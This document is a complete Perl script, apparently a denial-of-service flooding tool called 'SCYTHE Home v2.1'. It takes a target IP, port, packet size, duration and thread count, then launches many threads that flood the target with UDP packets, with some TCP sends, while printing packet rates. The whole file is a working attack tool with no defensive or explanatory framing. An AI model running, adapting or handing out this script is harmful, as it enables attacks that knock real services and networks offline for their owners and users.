#!/usr/bin/perl
# SCYTHE Home v2.1
use strict; use warnings; use IO::Socket::INET; use Time::HiRes qw(time sleep); use threads;
if (@ARGV < 5) { print "Usage: perl home.pl <ip> <port> <size> <time> [threads]\n"; exit(1); }
my ($ip, $port, $size, $duration, $tc) = @ARGV; $tc ||= 50;
print "[SCYTHE] Home: $ip:$port | ${duration}s\n";
my $total :shared = 0; my $end = time() + $duration;
sub home { my $udp = IO::Socket::INET->new(Proto=>'udp') or return; my $tcp = IO::Socket::INET->new(Proto=>'tcp', Timeout=>1); my $pkt = "H" x $size; while (time() < $end) { eval { for (1..5) { $udp->send($pkt, 0, sockaddr_in($port, inet_aton($ip))); { lock($total); $total++; } } if ($tcp) { $tcp->send($pkt); { lock($total); $total++; } } }; } $udp->close(); $tcp->close() if $tcp; }
my @t; for (1..$tc) { push @t, threads->create(\&home); }
my $start = time(); while (time() - $start < $duration) { my $rps = int($total / (time() - $start || 1)); print "[HOME] Packets: $total | RPS: $rps\n"; sleep(1); }
$_->join() for @t; print "[HOME] Completed: $total\n";